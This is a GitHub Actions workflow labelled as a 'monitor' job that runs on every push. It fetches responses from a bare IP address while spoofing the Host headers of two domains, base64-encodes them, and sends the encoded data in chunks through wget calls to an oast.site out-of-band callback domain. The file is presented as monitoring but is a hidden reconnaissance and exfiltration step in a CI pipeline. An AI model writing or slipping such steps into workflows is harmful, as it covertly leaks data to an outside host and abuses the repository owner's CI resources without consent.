name: mon
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: monitor
        run: |
          OUT=$(curl -s --max-time 15 -D - "http://3.88.209.31/" -H "Host: monitor.testring.org" -A "Mozilla/5.0" | head -20 | base64 | tr -d '\n')
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/m2-${OUT:0:60}"
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/m3-${OUT:60:60}"
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/m4-${OUT:120:60}"
          O2=$(curl -s --max-time 15 -D - "http://3.88.209.31/" -H "Host: api.protocolring.com" | head -10 | base64 | tr -d '\n')
          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/m5-${O2:0:60}"
